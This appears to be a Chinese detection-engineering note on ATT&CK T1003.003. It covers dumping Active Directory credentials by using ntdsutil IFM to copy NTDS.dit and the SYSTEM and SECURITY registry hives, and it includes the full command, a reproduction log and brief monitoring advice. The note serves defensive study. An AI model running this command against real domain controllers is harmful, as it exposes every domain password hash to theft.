# T1003-003-windows-基于NTDS凭证转储2

## 来自ATT&CK的描述

攻击者可能试图访问或创建Active Directory域数据库的副本，以便窃取凭据信息，以及获取有关域成员（例如设备，用户和访问权限）的其他信息。默认情况下，NTDS文件（NTDS.dit）位于%SystemRoot%\NTDS\Ntds.dit域控制器中。

除了在活动的域控制器上查找NTDS文件之外，攻击者还可能搜索包含相同或相似信息的备份。

下列工具和技术可用于枚举NTDS文件和整个Active Directory哈希的内容。
- 卷影复制
- secretsdump.py
- 使用内置的Windows工具ntdsutil.exe
- 调用卷影副本

### NTDS.dit

Ntds.dit文件是存储Active Directory数据的数据库，包括有关用户对象，组和组成员身份的信息。它包括域中所有用户的密码哈希值。域控制器（DC）上的ntds.dit文件只能由可以登录到DC的用户访问。很明显，保护这个文件至关重要，因为攻击者访问这个文件会导致整个域沦陷。
默认情况下，NTDS文件将位于域控制器的％SystemRoot％\NTDS\Ntds.dit中。但通常存储在其他逻辑驱动器上。AD数据库是一个Jet数据库引擎，它使用可扩展存储引擎（ESE）提供数据存储和索引服务。通过ESE级别索引，可以快速定位对象属性。

## 测试案例

使用NTDSUtil创建IFM抓取DC本地的Ntds.dit文件。

NTDSUTIL是一个命令行实用程序，在本地工作时需要AD数据库（NTDS.DIT）并支持为DCPROMO创建IFM。DCPROMO将使用IFM以“从媒体介质中安装”，这样服务器就不需要通过网络从另一台 DC 上复制域数据。适用于：Windows Server 2003，Windows Server 2003 R2，带有SP1的Windows Server 2003，Windows Server 2008，Windows Server 2008 R2。

Ntdsutil.exe是一个命令行工具，为Active Directory域服务（AD DS）和Active Directory轻型目录服务（AD LDS）提供管理工具。您可以使用ntdsutil命令来执行AD DS的数据库维护，管理和控制单个主操作，以及删除从网络中删除而未正确卸载的域控制器留下的元数据。该工具仅供有经验的管理员使用

Ntdsutil.exe的是内置在Windows Server 2008和Windows Server 2008 R2。如果您安装了AD DS或AD LDS服务器角色，则可以使用该角色。如果您安装作为远程服务器管理工具（RSAT）一部分的Active Directory域服务工具，它也将可用。

```dos
#!bash
ntdsutil “ac i ntds” “ifm” “create full c:\temp” q q
```

IFM 是一个 NTDS.dit文件的副本，放在**C://temp**目录中。当创建一个IFM时，也会产生并挂载一个VSS快照，同时Ntds.dit文件和相关的数据也被复制到目标文件夹中。

该文件可能存储在一个正在promot的新的DC的共享文件夹中，也可能出现在还没有promot的新的服务器上。
此服务器可能无法确保IFM数据的安全，包括复制Ntds.dit文件并提取凭证数据。这个命令也可以通过 WMI 或 PowerShell 远程执行。（建议使用powershell执行，DOS命令执行异常错误）

## 检测日志

windows 安全日志

## 测试复现

```dos
C:\Windows\system32\ntdsutil.exe: ac i ntds
活动实例设置为“ntds”。
C:\Windows\system32\ntdsutil.exe: ifm
ifm: create full c:\temp
正在创建快照...
成功生成快照集 {ea08df62-9743-4068-aedb-a2c32dfd057f}。
快照 {2d92b366-961f-45f0-9202-9aa6f069139f} 已作为 C:\$SNAP_201911011107_VOLUMEC$\ 装载
已装载快照 {2d92b366-961f-45f0-9202-9aa6f069139f}。
正在启动碎片整理模式...
     源数据库: C:\$SNAP_201911011107_VOLUMEC$\Windows\NTDS\ntds.dit
     目标数据库: c:\temp\Active Directory\ntds.dit

                  Defragmentation  Status (% complete)

          0    10   20   30   40   50   60   70   80   90  100
          |----|----|----|----|----|----|----|----|----|----|
          ...................................................

正在复制注册表文件...
正在复制 c:\temp\registry\SYSTEM
正在复制 c:\temp\registry\SECURITY
快照 {2d92b366-961f-45f0-9202-9aa6f069139f} 已卸载。
在 c:\temp 中成功创建 IFM 媒体。
ifm: q
C:\Windows\system32\ntdsutil.exe: q
```

## 测试留痕

暂无

## 检测规则/思路

建议针对进程、进程命令行参数进行监控。针对进程、进程命令行监控需要特定的环境，比如配置审核策略、采集sysmon日志等。

## 参考推荐

MITRE-ATT&CK-T1003-003

<https://attack.mitre.org/techniques/T1003/003>

NTDSutil简介

<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753343(v=ws.10)?redirectedfrom=MSDN>
